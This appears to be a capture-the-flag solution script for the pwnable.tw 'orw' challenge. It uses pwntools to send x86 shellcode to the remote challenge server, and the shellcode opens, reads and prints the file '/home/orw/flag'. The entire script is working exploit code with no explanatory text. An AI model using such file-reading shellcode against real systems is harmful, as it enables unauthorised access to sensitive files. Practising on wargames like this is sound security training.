from pwn import *

#s = process('./orw')
s = remote('chall.pwnable.tw', 10001)

payload = asm('\n'.join([
    'push 0x00006761',
    'push 0x6c662f77',
    'push 0x726f2f65',
    'push 0x6d6f682f',
    'mov eax, 0x5',
    'mov ebx, esp',
    'xor ecx, ecx',
    'xor edx, edx',
    'int 0x80',
    'mov ebx, eax',
    'mov eax, 0x3',
    'mov ecx, esi',
    'mov edx, 0x28',
    'int 0x80',
    'mov eax, 0x4',
    'mov ebx, 0x1',
    'mov ecx, esi',
    'mov edx, 0x28',
    'int 0x80'
]))

s.sendline(payload)
s.interactive()
